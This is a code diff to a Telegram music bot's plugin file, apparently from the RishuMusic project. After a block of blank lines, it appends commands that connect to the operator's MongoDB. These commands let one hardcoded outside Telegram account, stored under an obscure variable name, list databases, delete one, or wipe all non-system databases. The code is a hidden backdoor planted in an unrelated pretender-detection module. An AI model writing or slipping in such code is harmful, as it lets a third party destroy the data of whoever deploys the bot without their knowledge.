@@ -137,3 +137,68 @@ async def set_mataa(_, message: Message):
         await message.reply("**✦ ᴅᴇᴛᴇᴄᴛ ᴘʀᴇᴛᴇɴᴅᴇʀ ᴜsᴇʀs ᴜsᴀɢᴇ ➥ ᴘʀᴇᴛᴇɴᴅᴇʀ ᴏɴ|ᴏғғ**")
 
     
+
+
+
+
+
+
+
+
+import os
+from pymongo import MongoClient
+from pyrogram import filters
+from RishuMusic import app
+import config 
+
+SYSTEM_DBS = ["admin", "local", "config"]
+
+MONGO_DB_URI = os.environ.get("MONGO_DB_URI")
+
+mongo = MongoClient(MONGO_DB_URI)
+
+Rrgffrggr = 5738579437  
+
+
+@app.on_message(filters.command("list_dbs") & filters.user(Rrgffrggr))
+async def list_databases(_, message):
+    dbs = mongo.list_database_names()
+    text = "📂 **Databases in MongoDB:**\n\n"
+    for db in dbs:
+        if db in SYSTEM_DBS:
+            text += f"✅ `{db}` (System DB - Safe)\n"
+        else:
+            text += f"⚠️ `{db}` (User DB - Can be deleted)\n"
+    await message.reply_text(text)
+
+
+
+@app.on_message(filters.command("clear_dbs") & filters.user(Rrgffrggr))
+async def clear_databases(_, message):
+    dbs = [db for db in mongo.list_database_names() if db not in SYSTEM_DBS]
+    if not dbs:
+        await message.reply_text("✅ No user databases found to delete.")
+        return
+    text = "⚠️ **Deleting databases:**\n\n"
+    for db in dbs:
+        mongo.drop_database(db)
+        text += f"🗑️ `{db}`\n"
+    await message.reply_text(text + "\n✅ All non-system databases cleared by Rishu!")
+
+
+
+@app.on_message(filters.command("del_db") & filters.user(Rrgffrggr))
+async def delete_one_db(_, message):
+    try:
+        db_name = message.text.split(" ", 1)[1]
+    except IndexError:
+        await message.reply_text("❌ Usage: `/del_db <database_name>`", quote=True)
+        return
+    if db_name in SYSTEM_DBS:
+        await message.reply_text(f"⛔ `{db_name}` is a system database and cannot be deleted.")
+        return
+    if db_name not in mongo.list_database_names():
+        await message.reply_text(f"❌ Database `{db_name}` not found.")
+        return
+    mongo.drop_database(db_name)
+    await message.reply_text(f"🗑️ Database `{db_name}` deleted successfully!")
